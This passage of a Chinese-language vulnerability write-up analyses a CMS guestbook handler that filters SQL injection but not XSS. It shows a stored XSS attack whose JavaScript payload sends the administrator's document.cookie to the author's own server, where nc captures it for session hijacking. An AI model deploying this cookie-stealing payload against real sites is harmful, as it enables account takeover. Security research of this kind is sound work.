  <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"randval"</span><span class="p">]);</span><span class="c1">//释放session中的变量</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
  <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"randval"</span><span class="p">]);</span>
  <span class="nx">ok_info</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">"验证码输入有误!"</span><span class="p">);</span>
  <span class="k">exit</span><span class="p">();</span>
<span class="p">}</span>
<span class="nv">$byz</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b_yzcode'</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$byz</span><span class="o">!==</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$yzcode</span><span class="p">)){</span>
    <span class="nx">ok_info</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">'错误的参数！'</span><span class="p">);</span>
<span class="p">}</span>
<span class="nv">$siteinfo</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'type_id'</span> <span class="o">=&gt;</span> <span class="nb">intval</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'type_id'</span><span class="p">])),</span>
        <span class="s1">'b_title'</span> <span class="o">=&gt;</span> <span class="nx">injCheck</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b_title'</span><span class="p">]),</span>
        <span class="s1">'b_content'</span> <span class="o">=&gt;</span> <span class="nx">injCheck</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b_content'</span><span class="p">]),</span>
        <span class="s1">'b_name'</span> <span class="o">=&gt;</span> <span class="nx">injCheck</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b_name'</span><span class="p">]),</span>
        <span class="s1">'b_tel'</span> <span class="o">=&gt;</span> <span class="nx">injCheck</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b_tel'</span><span class="p">]),</span>
        <span class="s1">'b_mail'</span> <span class="o">=&gt;</span> <span class="nx">injCheck</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b_mail'</span><span class="p">]),</span>
        <span class="s1">'b_qq'</span> <span class="o">=&gt;</span> <span class="nx">injCheck</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b_qq'</span><span class="p">]),</span>
        <span class="s1">'b_ip'</span> <span class="o">=&gt;</span> <span class="nx">injCheck</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'b_ip'</span><span class="p">]),</span>
        <span class="s1">'c_date'</span> <span class="o">=&gt;</span> <span class="nb">time</span><span class="p">()</span>
        <span class="p">);</span>
<span class="nv">$db</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">(</span><span class="s2">"***cms_book"</span><span class="p">,</span> <span class="nv">$siteinfo</span><span class="p">);</span>
<span class="nv">$db</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
<span class="nx">ok_info</span><span class="p">(</span><span class="s1">'/index.php'</span><span class="p">,</span><span class="s1">'恭喜你，留言提交成功！'</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>第17行到第24行，只对sql注入进行了过滤，并没有对xss过滤，导致了这些提交字段都存在xss漏洞</p>
<p>然后我们到该页面，进行提交</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200408142303-671a6dae-7961-1.jpg"/></p>
<p>这里我是用我的服务器进行监听，<code>4.js</code>内容如下</p>
<pre><code>var image=new Image();
image.src="http://你的vps-ip:10006/cookies.phpcookie="+document.cookie;</code></pre>
<p>然后在我自己的服务器上nc监听</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200408142303-67447388-7961-1.jpg"/></p>
<p>然后当管理员在后台点击访问新回复的时候</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200408142304-67a73356-7961-1.jpg"/></p>
<p>然后可以打到cookie并且可以成功登录</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200408142305-67ff10a8-7961-1.jpg"/></p>
<h2 data-content="1" id="f44c273e3d5f89f375055b2d0dff7f39">小结</h2>
<p>其实这里也有后台存储型xss，但是很鸡肋，就不说了</p>
</div>
</div>